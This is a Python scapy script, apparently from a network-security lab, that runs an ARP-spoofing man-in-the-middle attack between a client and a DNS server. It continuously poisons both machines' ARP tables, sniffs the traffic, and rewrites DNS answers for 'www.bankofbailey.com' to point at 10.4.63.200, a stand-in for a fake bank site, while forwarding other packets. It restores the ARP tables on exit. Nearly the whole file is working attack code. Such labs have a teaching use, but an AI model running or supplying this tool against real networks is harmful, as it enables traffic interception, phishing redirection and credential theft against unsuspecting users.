# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=1, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# DONE: returns the mac address for an IP
def mac(IP):
    return srp1(Ether(dst="ff:ff:ff:ff:ff:ff", type=0x806) / ARP(op=1, pdst=IP, hwdst="00:00:00:00:00:00") ).hwsrc


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # DONE: Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # DONE: Spoof dnsServer ARP table
        time.sleep(interval)


# DONE: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    sendp(Ether(src=srcMAC, dst=dstMAC, type=0x806) / ARP(op=2, psrc=srcIP, pdst=dstIP, hwsrc=srcMAC) )


# DONE: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    sendp(Ether(src=srcMAC, dst=dstMAC, type=0x806) / ARP(op=2, psrc=srcIP, pdst=dstIP, hwsrc=srcMAC) )


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
    if packet.src != attackerMAC:
        if IP in packet:
            #print(packet.summary())
            ip_dst = packet[IP].dst
            if ip_dst == clientIP:
                hostname = packet[DNSQR].qname.decode().strip()
                if hostname[-1] == '.':
                    hostname = hostname[:-1]
                if hostname == "www.bankofbailey.com":
                    debug("Intercepted response for www.bankofbailey.com")
                    packet[DNSRR].rdata = "10.4.63.200"
                else:
                    debug("Intercepted response for something else:" + hostname)
                del packet[IP].len
                del packet[IP].chksum
                del packet[UDP].len
                del packet[UDP].chksum    
                sendp(Ether(dst=clientMAC) / packet[IP])

            elif ip_dst == serverIP:
                sendp(Ether(dst=serverMAC) / packet[IP])

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
